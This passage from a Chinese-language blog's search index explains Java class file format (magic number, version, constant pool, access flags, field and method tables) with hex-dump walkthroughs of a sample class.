Number\uff09\uff0c\u5b83\u7684\u552f\u4e00\u4f5c\u7528\u662f\u786e\u5b9a\u8fd9\u4e2a\u6587\u4ef6\u662f\u5426\u4e3a\u4e00\u4e2a\u80fd\u88ab\u865a\u62df\u673a\u63a5\u6536\u7684 Calss \u6587\u4ef6\u3002\u4e4b\u6240\u4ee5\u4f7f\u7528\u9b54\u6570\u800c\u4e0d\u662f\u6587\u4ef6\u540e\u7f00\u540d\u6765\u8fdb\u884c\u8bc6\u522b\u4e3b\u8981\u662f\u57fa\u4e8e\u5b89\u5168\u6027\u7684\u8003\u8651\uff0c\u56e0\u4e3a\u6587\u4ef6\u540e\u7f00\u540d\u662f\u53ef\u4ee5\u968f\u610f\u66f4\u6539\u7684\u3002Class \u6587\u4ef6\u7684\u9b54\u6570\u503c\u4e3a\u300c0xCAFEBABE\u300d\u3002\u4e4b\u6240\u4ee5\u662fCAFEBABE\u662f\u56e0\u4e3a\u6709\u4e00\u4f4d\u5f00\u53d1\u8005\u559c\u6b22\u8457\u540d\u5496\u5561\u54c1\u724c Peet`s Coffee\uff0c\u6b64\u540e\u51fa\u73b0\u7684Java\u5546\u6807\u4e5f\u662f\u4e00\u676f\u5496\u5561\u2026\u2026</p> <p>\u7d27\u63a5\u7740\u9b54\u6570\u7684 4 \u4e2a\u5b57\u8282\u5b58\u50a8\u7684\u662f Class \u6587\u4ef6\u7684\u7248\u672c\u53f7\uff1a\u7b2c 5 \u548c\u7b2c 6 \u4e24\u4e2a\u5b57\u8282\u662f\u6b21\u7248\u672c\u53f7\uff08Minor Version\uff09\uff0c\u7b2c 7 \u548c\u7b2c 8 \u4e2a\u5b57\u8282\u662f\u4e3b\u7248\u672c\u53f7\uff08Major Version\uff09\u3002\u9ad8\u7248\u672c\u7684 JDK \u80fd\u591f\u5411\u4e0b\u517c\u5bb9\u4f4e\u7248\u672c\u7684 Class \u6587\u4ef6\uff0c\u865a\u62df\u673a\u4f1a\u62d2\u7edd\u6267\u884c\u8d85\u8fc7\u5176\u7248\u672c\u53f7\u7684 Class \u6587\u4ef6\u3002</p> <p></p> <pre><code>#           \u9b54\u6570        \u6b21\u7248\u672c\u53f7    \u4e3b\u7248\u672c\u53f7\n0000000: cafe babe       0000       0034    0013 0a00 0400 0f09  .......4........                   \n</code></pre> <p>\u6839\u636e\u4ee5\u4e0a\u4fe1\u606f\u53ef\u4ee5\u83b7\u5f97\u4e3b\u7248\u672c\u53f7\u4fe1\u606f 0x0034 \u7684\u5341\u8fdb\u523652\uff0c52\u5bf9\u5e94\u7684JDK\u7248\u672c\u662fJDK8\uff0c\u53ef\u4ee5\u5411\u4e0b\u517c\u5bb945-51\u7684JDK\u7248\u672c\u3002JDK\u7248\u672c\u662f\u4ece45\u5f00\u59cb\u7684\uff0cJDK1.0-1.1 \u4f7f\u7528\u4e8645.0-45.3\u7684\u7248\u672c\u53f7\u3002</p> <p>\u6b21\u7248\u672c\u53f7\u5728JDK12\u4e4b\u524d\u90fd\u6ca1\u6709\u4f7f\u7528\u8fc7\uff0c\u5168\u4e3a0\u3002</p> <p>\u5b57\u8282\u7801\u6587\u4ef6\u5185\u5bb9\uff1a</p> <p></p>"},{"location":"CTF/Java_Security/Article1/index.html#23","title":"2.3 \u5e38\u91cf\u6c60","text":"<p>\u4e3b\u7248\u672c\u53f7\u4e4b\u540e\u662f\u5e38\u91cf\u6c60\u5165\u53e3\uff0c\u5e38\u91cf\u6c60\u53ef\u4ee5\u7406\u89e3\u4e3a Class \u6587\u4ef6\u4e4b\u4e2d\u7684\u8d44\u6e90\u4ed3\u5e93\uff0c\u5b83\u662f Class \u6587\u4ef6\u7ed3\u6784\u4e2d\u4e0e\u5176\u4ed6\u9879\u76ee\u5173\u8054\u6700\u591a\u7684\u6570\u636e\u7c7b\u578b\uff0c\u4e5f\u662f\u5360\u7528 Class \u6587\u4ef6\u7a7a\u95f4\u6700\u5927\u7684\u6570\u636e\u9879\u76ee\u4e4b\u4e00\uff0c\u540c\u662f\u5b83\u8fd8\u662f Class \u6587\u4ef6\u4e2d\u7b2c\u4e00\u4e2a\u51fa\u73b0\u7684\u8868\u7c7b\u578b\u6570\u636e\u9879\u76ee\u3002</p> <p>\u56e0\u4e3a\u5e38\u91cf\u6c60\u4e2d\u5e38\u91cf\u7684\u6570\u91cf\u662f\u4e0d\u56fa\u5b9a\u7684\uff0c\u6240\u4ee5\u5728\u5e38\u91cf\u6c60\u5165\u53e3\u9700\u8981\u653e\u7f6e\u4e00\u4e2a u2 \u7c7b\u578b\u7684\u6570\u636e\u6765\u8868\u793a\u5e38\u91cf\u6c60\u7684\u5bb9\u91cf<code>\u300cconstant_pool_count\u300d</code>\uff0c\u548c\u8ba1\u7b97\u673a\u79d1\u5b66\u4e2d\u8ba1\u6570\u7684\u65b9\u6cd5\u4e0d\u4e00\u6837\uff0c\u8fd9\u4e2a<code>\u5bb9\u91cf\u662f\u4ece 1 \u5f00\u59cb\u800c\u4e0d\u662f\u4ece 0 \u5f00\u59cb\u8ba1\u6570</code>\u3002\u4e4b\u6240\u4ee5\u5c06\u7b2c 0 \u9879\u5e38\u91cf\u7a7a\u51fa\u6765\u662f\u4e3a\u4e86\u6ee1\u8db3\u540e\u9762\u67d0\u4e9b\u6307\u5411\u5e38\u91cf\u6c60\u7684\u7d22\u5f15\u503c\u7684\u6570\u636e\u5728\u7279\u5b9a\u60c5\u51b5\u4e0b\u9700\u8981\u8868\u8fbe\u300c\u4e0d\u5f15\u7528\u4efb\u4f55\u4e00\u4e2a\u5e38\u91cf\u6c60\u9879\u76ee\u300d\u7684\u542b\u4e49\uff0c\u8fd9\u79cd\u60c5\u51b5\u53ef\u4ee5\u628a\u7d22\u5f15\u503c\u7f6e\u4e3a 0 \u6765\u8868\u793a\u3002</p> <p>Class \u6587\u4ef6\u7ed3\u6784\u4e2d\u53ea\u6709\u5e38\u91cf\u6c60\u7684\u5bb9\u91cf\u8ba1\u6570\u662f\u4ece 1 \u5f00\u59cb\u7684\uff0c\u5176\u5b83\u96c6\u5408\u7c7b\u578b\uff0c\u5305\u62ec\u63a5\u53e3\u7d22\u5f15\u96c6\u5408\u3001\u5b57\u6bb5\u8868\u96c6\u5408\u3001\u65b9\u6cd5\u8868\u96c6\u5408\u7b49\u5bb9\u91cf\u8ba1\u6570\u90fd\u662f\u4ece 0 \u5f00\u59cb\u3002</p> <p>\u5e38\u91cf\u6c60\u4e2d\u4e3b\u8981\u5b58\u653e\u4e24\u5927\u7c7b\u5e38\u91cf\uff1a\u5b57\u9762\u91cf\u548c\u7b26\u53f7\u5f15\u7528\u3002</p> <ul> <li>\u5b57\u9762\u91cf\u6bd4\u8f83\u63a5\u8fd1 Java \u8bed\u8a00\u5c42\u9762\u7684\u5e38\u91cf\u6982\u5ff5\uff0c\u5982\u5b57\u7b26\u4e32\u3001\u58f0\u660e\u4e3a final \u7684\u5e38\u91cf\u503c\u7b49\u3002</li> <li>\u7b26\u53f7\u5f15\u7528\u5c5e\u4e8e\u7f16\u8bd1\u539f\u7406\u65b9\u9762\u7684\u6982\u5ff5\uff0c\u5305\u62ec\u4e86\u4ee5\u4e0b\u4e09\u7c7b\u5e38\u91cf\uff1a\u7c7b\u548c\u63a5\u53e3\u7684\u5168\u9650\u5b9a\u540d,\u5b57\u6bb5\u7684\u540d\u79f0\u548c\u63cf\u8ff0\u7b26,\u65b9\u6cd5\u7684\u540d\u79f0\u548c\u63cf\u8ff0\u7b26</li> </ul> <p>\u7ecf\u8fc7javac\u7f16\u8bd1\u540e\u7684Class\u6587\u4ef6\u4e0d\u4f1a\u4fdd\u5b58\u65b9\u6cd5\u3001\u5b57\u6bb5\u6700\u7ec8\u5728\u5185\u5b58\u4e2d\u7684\u5e03\u5c40\u4fe1\u606f\uff0c\u800c\u662f\u4fdd\u5b58\u5176\u5177\u4f53\u5730\u5740\u7684\u7b26\u53f7\u5f15\u7528\u3002\u5f53\u865a\u62df\u673a\u505a\u7c7b\u52a0\u8f7d\u65f6\uff0c\u5c06\u4f1a\u4ece\u5e38\u91cf\u6c60\u83b7\u5f97\u5bf9\u5e94\u7684\u7b26\u53f7\u5f15\u7528\uff0c\u518d\u5728\u7c7b\u521b\u5efa\u65f6\u6216\u8fd0\u884c\u65f6\u89e3\u6790\u7ffb\u8bd1\u5230\u5177\u4f53\u7684\u5185\u5b58\u5730\u5740\u4e2d\u3002</p> <pre><code>#                \u5e38\u91cf\u6c60\u5927\u5c0f\n0000000: cafe babe 0000 0034   0013    0a 00 0400 0f09  .......4........\n</code></pre> <p>\u6839\u636e\u4ee5\u4e0a\u4fe1\u606f\u53ef\u4ee5\u5f97\u51fa\uff0c\u5e38\u91cf\u6c60\u5bb9\u91cf\u662f\u5341\u516d\u8fdb\u52360x0013\uff0c\u5341\u8fdb\u5236\u4e3a19\uff0c\u56e0\u6b64\u5e38\u91cf\u6c60\u4e2d\u670918\u9879\u5e38\u91cf\uff0c\u7d22\u5f15\u8303\u56f4\u57281-18\u3002</p>"},{"location":"CTF/Java_Security/Article1/index.html#_2","title":"\u5e38\u91cf\u6c60\u5e38\u91cf\u5206\u6790","text":"<p>Class\u5e38\u91cf\u6c60\u7c7b\u578b\u5206\u7c7b\u5982\u4e0b\uff1a</p> <p></p> <p>\u5e38\u91cf\u6c60\u5bb9\u91cf\u5927\u5c0f<code>0x0013</code>\u4e4b\u540e\u670918\u4e2a\u5e38\u91cf\uff0c\u6bcf\u4e2a\u5e38\u91cf\u6240\u5360\u5360\u7528\u7684\u5b57\u8282\u5927\u5c0f\u90fd\u4e0d\u76f8\u540c\uff0c\u4ee5\u7b2c\u4e00\u4e2a\u5e38\u91cf <code>0x0a</code>(\u5341\u8fdb\u5236\u4e3a10)\u4e3a\u4f8b\uff0c\u67e5\u5e38\u91cf\u6c60\u9879\u76ee\u7c7b\u578b\u8868\u53ef\u77e5\uff08\u5e38\u91cf\u7c7b\u578b\u8868\u7684\u7ed3\u6784\u4e00\u822c\u4e3a tag\uff08u1\uff09 \u548c index\uff08u2\uff09\uff09\uff0c10\u4e3a\u7c7b\u4e2d\u65b9\u6cd5\u7684\u7b26\u53f7\u5f15\u7528<code>CONSTANT_Methodref_info</code>\uff0c\u8be5\u5f15\u7528 \u6709\u4e00\u4e2atag \uff08u1\u7c7b\u578b\u5360\u7528\u4e00\u4e2a\u5b57\u8282 = 0x0a = 10\uff09\u3001\u4e24\u4e2aindex\uff08u2\u7c7b\u578b\u5360\u7528\u4e24\u4e2a\u5b57\u8282 0x0004\u548c0x000f\uff09, \u7b2c\u4e00\u4e2a<code>index = 4</code>\u6307\u5411\u58f0\u660e\u65b9\u6cd5\u63cf\u8ff0\u7b26<code>CONSTANT_Class_info</code>\u7684\u7d22\u5f15\u9879\uff0c\u7b2c\u4e8c\u4e2a<code>index = 15</code>\u6307\u5411\u540d\u79f0\u53ca\u7c7b\u578b\u63cf\u8ff0\u7b26<code>CONSTANT_NameAndType</code>\u7684\u7d22\u5f15\u9879\u3002</p> <p></p> <p></p> <p>\u6839\u636e\u7b2c\u4e00\u4e2aindex\u7d22\u5f15\u503c0x0004 \u4ee3\u8868\u7b2c\u56db\u4e2a\u5e38\u91cf\uff0c\u7b2c\u56db\u4e2a\u5e38\u91cf\u7684 tag \u662f0x07\u4e3aCONSTANT_Class_info\uff0c\u7ed3\u6784\u4e3atag\u548cindex\uff08\u6307\u5411\u5168\u9650\u5b9a\u540d\u5e38\u91cf\u9879\u7684\u7d22\u5f15\uff09\uff0c\u5219tag = 7(0x07)\uff0cindex = 18\uff080x0012\uff09\u7d22\u5f15\u4e3a18\u8868\u793a\u4e3a\u6700\u540e\u4e00\u4e2a\u5e38\u91cf\uff0c\u67e5\u5e38\u91cf\u6c60\u77e5\uff0c\u7b2c18\u4e2a\u5e38\u91cf\u4e3a 0x01\u662fCONSTANT_Utf8_info\u5e38\u91cf\uff0c\u5176\u957f\u5ea6\u4e3a0x0010 = 16\u4e2a\u5b57\u8282 \uff0c\u7531\u4e0a\u9762\u7684Constant pool\u77e5\uff0c\u8fd916\u4e2a\u5b57\u8282\u8868\u793a java/lang/Object\u3002\u4f9d\u6b21\u7c7b\u63a8\u5373\u53ef\u67e5\u8be2\u6240\u6709\u7684\u5e38\u91cf\u4fe1\u606f</p> <p></p> <p>\u5e38\u91cf\u6c60\u7684\u6240\u6709\u5185\u5bb9\uff1a</p> <p></p>"},{"location":"CTF/Java_Security/Article1/index.html#24","title":"2.4\u8bbf\u95ee\u6807\u5fd7","text":"<p>\u7d27\u63a5\u7740\u5e38\u91cf\u6c60\u4e4b\u540e\u7684\u4e24\u4e2a\u5b57\u8282\u4ee3\u8868\u8bbf\u95ee\u6807\u5fd7\uff08access_flag\uff09\uff0c\u8fd9\u4e2a\u6807\u5fd7\u7528\u4e8e\u8bc6\u522b\u4e00\u4e9b\u7c7b\u6216\u8005\u63a5\u53e3\u5c42\u6b21\u7684\u8bbf\u95ee\u4fe1\u606f\uff0c\u5305\u62ec\u8fd9\u4e2a Class \u662f\u7c7b\u8fd8\u662f\u63a5\u53e3\uff1b\u662f\u5426\u5b9a\u4e49\u4e3a public \u7c7b\u578b\uff1b\u662f\u5426\u5b9a\u4e49\u4e3a abstract \u7c7b\u578b\uff1b\u5982\u679c\u662f\u7c7b\u7684\u8bdd\uff0c\u662f\u5426\u88ab\u7533\u660e\u4e3a final \u7b49\u3002\u5177\u4f53\u7684\u6807\u5fd7\u4f4d\u4ee5\u53ca\u6807\u5fd7\u7684\u542b\u4e49\u89c1\u4e0b\u8868\uff1a</p> <p></p> <p>access_flags \u4e2d\u4e00\u5171\u6709 16 \u4e2a\u6807\u5fd7\u4f4d\u53ef\u4ee5\u4f7f\u7528\uff0c\u5f53\u524d\u53ea\u5b9a\u4e49\u4e86\u5176\u4e2d\u7684 9\u4e2a\uff0c\u6ca1\u6709\u4f7f\u7528\u5230\u7684\u6807\u5fd7\u4f4d\u8981\u6c42\u4e00\u5f8b\u4e3a 0\u3002</p> <p>\u4ee5Test.Class\u4e3a\u4f8b\uff0c\u4ed6\u662f\u4e00\u4e2a\u666e\u901aJava\u7c7b\uff0c\u4e0d\u662f\u63a5\u53e3\u3001\u679a\u4e3e\u3001\u6ce8\u89e3\u7b49\uff0c\u88abpublic\u4fee\u9970\u4f46\u6ca1\u6709\u88ab\u58f0\u660e\u4e3afinal\u6216abstract\uff0c\u4f7f\u7528\u4e86JDK1.2\u4e4b\u540e\u7684\u7f16\u8bd1\u5668\u8fdb\u884c\u7f16\u8bd1 \uff0c\u56e0\u6b64\u4ed6\u7684ACC_SUPER\u548cACC_PUBLIC\u4e3a\u771f\uff0c\u5176\u4f59\u4e3a\u5047\u3002\u56e0\u6b64access_flag\u7684\u503c\u4e3a\uff1a0x0001|0x0020 = 0x0021</p> <p>\u6ce8\u610f\uff1a0021\u662f\u4f4d\u8fd0\u7b97\u540e\u5f97\u5230\u7684</p> <p></p> <p></p>"},{"location":"CTF/Java_Security/Article1/index.html#25","title":"2.5\u7c7b\u7d22\u5f15\u3001\u7236\u7c7b\u7d22\u5f15\u4e0e\u63a5\u53e3\u7d22\u5f15\u96c6\u5408","text":"<p>\u7c7b\u7d22\u5f15\uff08this_class\uff09\u548c\u7236\u7c7b\u7d22\u5f15\uff08super_class\uff09\u90fd\u662f\u4e00\u4e2a u2 \u7c7b\u578b\u7684\u6570\u636e\uff0c\u800c\u63a5\u53e3\u7d22\u5f15\u96c6\u5408\uff08interfaces\uff09\u662f\u4e00\u7ec4 u2 \u7c7b\u578b\u7684\u6570\u636e\u96c6\u5408\uff0cClass \u6587\u4ef6\u4e2d\u7531\u8fd9\u4e09\u9879\u6570\u636e\u6765\u786e\u5b9a\u8fd9\u4e2a\u7c7b\u7684\u7ee7\u627f\u5173\u7cfb\u3002</p> <ul> <li>\u7c7b\u7d22\u5f15\u7528\u4e8e\u786e\u5b9a\u8fd9\u4e2a\u7c7b\u7684\u5168\u9650\u5b9a\u540d</li> <li>\u7236\u7c7b\u7d22\u5f15\u7528\u4e8e\u786e\u5b9a\u8fd9\u4e2a\u7c7b\u7684\u7236\u7c7b\u7684\u5168\u9650\u5b9a\u540d</li> <li>\u63a5\u53e3\u7d22\u5f15\u96c6\u5408\u7528\u4e8e\u63cf\u8ff0\u8fd9\u4e2a\u7c7b\u5b9e\u73b0\u4e86\u54ea\u4e9b\u63a5\u53e3</li> </ul> <p>\u7c7b\u7d22\u5f15\u3001\u7236\u7c7b\u7d22\u5f15\u3001\u63a5\u53e3\u7d22\u5f15\u90fd\u6392\u5728\u8bbf\u95ee\u6807\u5fd7\u4e4b\u540e\u3002\u7531\u4e8e\u6240\u6709\u7684\u7c7b\u90fd\u662fjava.lang.Object\u7c7b\u7684\u5b50\u7c7b\uff0c\u56e0\u6b64\u9664\u4e86Object\u7c7b\u4e4b\u5916\u6240\u6709\u7c7b\u7684\u7236\u7c7b\u7d22\u5f15\u90fd\u4e0d\u4e3a0\u3002</p> <p>\u7c7b\u7d22\u5f15\u548c\u7236\u7c7b\u7d22\u5f15\u5404\u81ea\u6307\u5411CONSTANT_Class_info\u7684\u7c7b\u63cf\u8ff0\u5e38\u91cf\uff0c\u901a\u8fc7CONSTANT_Class_info\u7684\u7c7b\u578b\u5e38\u91cf\u4e2d\u7684\u7d22\u5f15\u53ef\u4ee5\u627e\u5230CONSTANT_Utf8_info\u7c7b\u578b\u7684\u5e38\u91cf\u4e2d\u7684\u5168\u9650\u5b9a\u540d\u5b57\u7b26\u4e32\u3002\u4ece\u800c\u83b7\u53d6\u5230\u8be5\u7c7b\u7684\u5168\u9650\u5b9a\u540d</p> <p></p> <p>\u6839\u636e\u4e0a\u8ff0\u5b57\u8282\u7801\u6587\u4ef6\uff1a0x0021\u4e4b\u540e\u5c31\u662f\u7c7b\u7d22\u5f15\uff08this_class\uff090x0003\uff0c\u5373\u5e38\u91cf\u6c60\u7d22\u5f15\u4e3a3\u7684\u7b2c\u4e09\u4e2a\u5e38\u91cf0x07\uff08CONSTANT_Class_info\u7c7b\u578b\u5e38\u91cf\uff09\uff0c\u540e\u9762\u76840x0011\u6307\u5411\u5168\u9650\u5b9a\u540d\u5e38\u91cf\u9879\u7684\u7d22\u5f15\uff0c\u5373\u7b2c17\u4e2a\u5e38\u91cf\uff0c\u8be5\u5e38\u91cf\u4e00\u5b9a\u662f\u4e00\u4e2aCONSTANT_Utf8_info\u7c7b\u578b\u7684\u5e38\u91cf\uff0c\u8be5\u5e38\u91cf\u9664\u4e86tag\u7d22\u5f15\u503c\u5916\uff0c\u540e\u9762\u7684u2\u4e3alength\u8868\u793aUTF-8\u7f16\u7801\u7684\u5b57\u7b26\u4e32\u957f\u5ea6\uff08\u4ee5\u5b57\u8282\u4e3a\u5355\u4f4d\uff09\uff0clength\u540e\u9762\u768416\u8fdb\u5236\u5b57\u8282\u7801\u5c31\u662f\u76f8\u5e94\u7684\u5b57\u7b26\u4e32\u3002</p> <pre><code>flags: ACC_PUBLIC, ACC_SUPER\nConstant pool:\n   #3 = Class              #17            // Test\n  #17 = Utf8               Test\n</code></pre> <p>\u7c7b\u7d22\u5f15\u4e4b\u540e\u4e3a\u7236\u7c7b\u7d22\u5f15\uff08super_class\uff09 = 0x0004\uff0c\u5341\u8fdb\u5236\u8868\u793a\u7b2c4\u4e2a\u5e38\u91cf</p> <pre><code>flags: ACC_PUBLIC, ACC_SUPER\nConstant pool:\n   #4 = Class              #18            // java/lang/Object\n  #18 = Utf8               java/lang/Object\n</code></pre> <p>\u7236\u7c7b\u7d22\u5f15\u4e4b\u540e\u4e3a\u63a5\u53e3\u7d22\u5f15\uff08interfaces\uff09 = 0x0000\uff0c\u56e0\u4e3a\u6ca1\u6709\u5b9e\u73b0\u4efb\u4f55\u63a5\u53e3\uff0c\u56e0\u6b64\u4e3a\u51680.</p>"},{"location":"CTF/Java_Security/Article1/index.html#26","title":"2.6\u5b57\u6bb5\u8868\u96c6\u5408","text":"<p>\u5b57\u6bb5\u8868\u96c6\u5408\uff08field_info\uff09\u7528\u4e8e\u63cf\u8ff0\u63a5\u53e3\u6216\u8005\u7c7b\u4e2d\u58f0\u660e\u7684\u53d8\u91cf\u3002\u5b57\u6bb5\uff08field\uff09\u5305\u62ec\u7c7b\u53d8\u91cf\u548c\u5b9e\u4f8b\u53d8\u91cf\uff0c\u4f46\u4e0d\u5305\u62ec\u65b9\u6cd5\u5185\u90e8\u58f0\u660e\u7684\u5c40\u90e8\u53d8\u91cf\u3002</p> <p>\u5b57\u6bb5\u8868\u7684\u7ed3\u6784\uff1a</p> <p></p> <p>\u5b57\u6bb5\u4fee\u9970\u7b26\u653e\u5728 access_flags \u4e2d\u53ef\u8bbe\u7f6e\u7684\u6807\u5fd7\u7b26\u6709\ud83d\udc47 \uff0c\u5b83\u4e0e\u7c7b\u4e2d\u7684 access_flag \u975e\u5e38\u76f8\u4f3c\uff0c\u90fd\u662f\u4e00\u4e2a u2 \u7684\u6570\u636e\u7c7b\u578b\u3002</p> <p></p> <p>Test.java\u7c7b\u4e2d\u58f0\u660e\u7684\u53d8\u91cf\u6709 <code>private int m</code>\uff1b\u67e5\u770b\u4e0b\u5217\u5b57\u8282\u7801\u6807\u6ce8\u548c\u5b57\u6bb5\u4fee\u9970\u7b26\u8868\u77e5<code>access_flag = 0x0002= ACC_PRIVATE</code></p> <pre><code>#                     fields_count  access_flag   name_index  descriptor_index   attributes_count\n00000a0: 03 0004 0000     0001        0002          0005           0006             0000  \n</code></pre> <p></p> <p><code>name_index = 0x0005 = 5</code> \uff0c\u67e5\u770b\u5e38\u91cf\u6c60\u8868\u7b2c\u4e94\u4e2a\u5e38\u91cf\u662f<code>CONSTANT_Utf8_info</code>\uff0c\u5176\u503c\u4e3a m\u3002\u800c <code>descriptor_index = 0x0006=6</code>\uff0c\u4e5f\u662f<code>CONSTANT_Utf8_info</code>\u5e38\u91cf\uff0c\u503c\u4e3a I</p> <p></p> <p><code>attributes_count</code>\u8868\u793a\u5c5e\u6027\u8868\u8ba1\u6570\u5668\u4e3a0\uff0c\u4e5f\u5c31\u662f\u6ca1\u6709\u9700\u8981\u989d\u5916\u63cf\u8ff0\u7684\u4fe1\u606f\u3002\u4f46\u662f\u5982\u679c\u5c06 \u5b57\u6bb5 m \u7684\u58f0\u660e\u6539\u4e3a<code>private int m = 123</code>\uff0c\u5219\u4f1a\u5b58\u5728\u4e00\u9879\u540d\u79f0\u4e3a<code>ConstantVaule</code>\u7684\u5c5e\u6027\uff0c\u5176\u503c\u6307\u5411\u5e38\u91cf123\u3002</p>"},{"location":"CTF/Java_Security/Article1/index.html#27","title":"2.7\u65b9\u6cd5\u8868\u96c6\u5408","text":"<p>Class \u6587\u4ef6\u4e2d\u5bf9\u65b9\u6cd5\u7684\u63cf\u8ff0\u548c\u5bf9\u5b57\u6bb5\u7684\u63cf\u8ff0\u662f\u5b8c\u5168\u4e00\u81f4\u7684\uff0c\u65b9\u6cd5\u8868\u4e2d\u7684\u7ed3\u6784\u548c\u5b57\u6bb5\u8868\u7684\u7ed3\u6784\u4e00\u6837\u3002</p> <p>\u56e0\u4e3a volatile \u5173\u952e\u5b57\u548c transient \u5173\u952e\u5b57\u4e0d\u80fd\u4fee\u9970\u65b9\u6cd5\uff0c\u6240\u4ee5\u65b9\u6cd5\u8868\u7684\u8bbf\u95ee\u6807\u5fd7\u4e2d\u6ca1\u6709 ACC_VOLATILE \u548c ACC_TRANSIENT\u3002\u4e0e\u4e4b\u76f8\u5bf9\u7684\uff0csynchronizes\u3001native\u3001strictfp \u548c abstract \u5173\u952e\u5b57\u53ef\u4ee5\u4fee\u9970\u65b9\u6cd5\uff0c\u6240\u4ee5\u65b9\u6cd5\u8868\u7684\u8bbf\u95ee\u6807\u5fd7\u4e2d\u589e\u52a0\u4e86 ACC_SYNCHRONIZED\u3001ACC_NATIVE\u3001ACC_STRICTFP \u548c ACC_ABSTRACT \u6807\u5fd7\u3002</p> <p>\u5bf9\u4e8e\u65b9\u6cd5\u91cc\u7684\u4ee3\u7801\uff0c\u7ecf\u8fc7\u7f16\u8bd1\u5668\u7f16\u8bd1\u6210\u5b57\u8282\u7801\u6307\u4ee4\u540e\uff0c\u5b58\u653e\u5728\u65b9\u6cd5\u5c5e\u6027\u8868\u4e2d\u4e00\u4e2a\u540d\u4e3a\u300cCode\u300d\u7684\u5c5e\u6027\u91cc\u9762\u3002</p> <p>\u65b9\u6cd5\u8868\u7684\u7ed3\u6784</p> <p></p> <p>\u6807\u5fd7\u7b26\u6709\uff1a</p> <p></p> <p>\u6839\u636e<code>methods_count = 2</code>\u77e5Test.java\u7c7b\u4e2d\u6709\u4e24\u4e2a\u65b9\u6cd5\uff0c\u9664\u4e86inc\uff08\uff09\u65b9\u6cd5\u5916\uff0c\u8fd8\u6709\u4e00\u4e2a\u7f16\u8bd1\u5668\u6dfb\u52a0\u7684\u5b9e\u4f8b\u6784\u9020\u65b9\u6cd5\u3002 <p>\u7b2c\u4e00\u4e2a\u65b9\u6cd5\u7684\u8bbf\u95ee\u6807\u5fd7\u503c\u4e3a<code>access_flag = 0x0001</code>\u5373ACC_PUBLIC\u65b9\u6cd5\uff0c<code>name_index = 0x0007</code>\u67e5\u5e38\u91cf\u6c60\u77e5\u540d\u4e3a()\u7684\u65b9\u6cd5\uff0c\u63cf\u8ff0\u7d22\u5f15\u503c<code>descriptor_index = 0x0008</code>\uff0c\u67e5\u5b57\u8282\u7801\u5e38\u91cf\u6c60\u77e5 \u4ee3\u8868\u201c\uff08\uff09V\u201d\u7684\u5e38\u91cf\u3002\u5c5e\u6027\u8868\u8ba1\u6570\u5668<code>attributes_count = 0x0001</code>\u8868\u540d\u6b64\u65b9\u6cd5\u7684\u5c5e\u6027\u8868\u96c6\u5408\u67091\u9879\u5c5e\u6027\uff0c\u5c5e\u6027\u540d\u79f0\u7684\u7d22\u5f15\u503c\u4e3a<code>0x0009</code>\uff0c\u5bf9\u5e94\u7684\u5e38\u91cf\u4e3a\u201cCode\u201d\uff0c\u8bf4\u660e\u6b64\u5c5e\u6027\u662f\u65b9\u6cd5\u7684\u5b57\u8282\u7801\u63cf\u8ff0\u3002 <pre><code>#     methods_count  access_flag  name_index   descriptor_index  attributes_count\n00000b0: 0002         0001            0007         0008              0001     \n#    attributes_name_index\n         0009                00 00 00 1d 00 \n</code></pre> <p></p> <p></p> <p>\u5982\u679c\u7236\u7c7b\u65b9\u6cd5\u6ca1\u6709\u88ab\u5b50\u7c7b\u91cd\u5199\uff0c\u65b9\u6cd5\u8868\u96c6\u5408\u4e2d\u5c31\u4e0d\u4f1a\u51fa\u73b0\u6765\u81ea\u7236\u7c7b\u7684\u65b9\u6cd5\u4fe1\u606f\u3002\u5426\u5219\u7f16\u8bd1\u5668\u4f1a\u81ea\u52a8\u6dfb\u52a0\u65b9\u6cd5\uff0c\u6700\u5e38\u89c1\u7684\u6dfb\u52a0\u7684\u65b9\u6cd5\u4fbf\u662f\u7c7b\u6784\u9020\u5668\uff08\uff09\u548c\u5b9e\u4f8b\u6784\u9020\u5668\uff08\uff09\u3002"},{"location":"CTF/Java_Security/Article1/index.html#28","title":"2.8 \u5c5e\u6027\u8868\u96c6\u5408","text":"<p>\u5728 Class \u6587\u4ef6\u3001\u5b57\u6bb5\u8868\u3001\u65b9\u6cd5\u8868\u4e2d\u90fd\u53ef\u4ee5\u643a\u5e26\u81ea\u5df1\u7684\u5c5e\u6027\u8868\uff08attribute_info\uff09\u96c6\u5408\uff0c\u7528\u4e8e\u63cf\u8ff0\u67d0\u4e9b\u573a\u666f\u4e13\u6709\u7684\u4fe1\u606f\u3002</p> <p>\u5c5e\u6027\u8868\u96c6\u5408\u4e0d\u50cf Class \u6587\u4ef6\u4e2d\u7684\u5176\u5b83\u6570\u636e\u9879\u8981\u6c42\u8fd9\u4e48\u4e25\u683c\uff0c\u4e0d\u5f3a\u5236\u8981\u6c42\u5404\u5c5e\u6027\u8868\u7684\u987a\u5e8f\uff0c\u5e76\u4e14\u53ea\u8981\u4e0d\u4e0e\u5df2\u6709\u5c5e\u6027\u540d\u91cd\u590d\uff0c\u4efb\u4f55\u4eba\u5b9e\u73b0\u7684\u7f16\u8bd1\u5668\u90fd\u53ef\u4ee5\u5411\u5c5e\u6027\u8868\u4e2d\u5199\u5165\u81ea\u5df1\u5b9a\u4e49\u7684\u5c5e\u6027\u4fe1\u606f\uff0cJava \u865a\u62df\u673a\u5728\u8fd0\u884c\u65f6\u4f1a\u7565\u6389\u5b83\u4e0d\u8ba4\u8bc6\u7684\u5c5e\u6027\u3002</p>"},{"location":"CTF/Java_Security/Article1/index.html#_3","title":"\u4e09.\u53c2\u8003","text":"<p>https://www.cnblogs.com/code-duck/p/13568004.html</p> <p>https://www.bilibili.com/video/BV1xJ41167VH?p=1&amp;vd_source=9827e9d785821d274ae12c344def5345</p>"},{"location":"CTF/Java_Security/Article2/index.html","title":"\u4e00.JVM\u662f\u4ec0\u4e48\uff1f","text":"<p>Java\u7684\u6d41\u884c\u5f88\u5927\u4e00\u4e2a\u56e0\u7d20\u90fd\u5f97\u76ca\u4e8e\u5b83\u662f\u4e00\u95e8\u8de8\u5e73\u53f0\u7684\u8bed\u8a00\uff0c\u53ea\u9700\u4e00\u6b21\u7f16\u8bd1\u5c31\u53ef\u4ee5\u5728\u5404\u4e2a\u4e0d\u540c\u7684\u5e73\u53f0\u8fd0\u884c\u3002\u4e25\u683c\u6765\u8bf4\u8de8\u5e73\u53f0\u7684\u7279\u6027\u5e76\u975eJava\u8bed\u8a00\u7684\u7279\u6027\uff0c\u5176\u5b9e\u63d0\u4f9b\u8fd9\u4e2a\u7279\u6027\u7684\u662fJVM\uff0c\u53ea\u662f\u6211\u4eec\u7ecf\u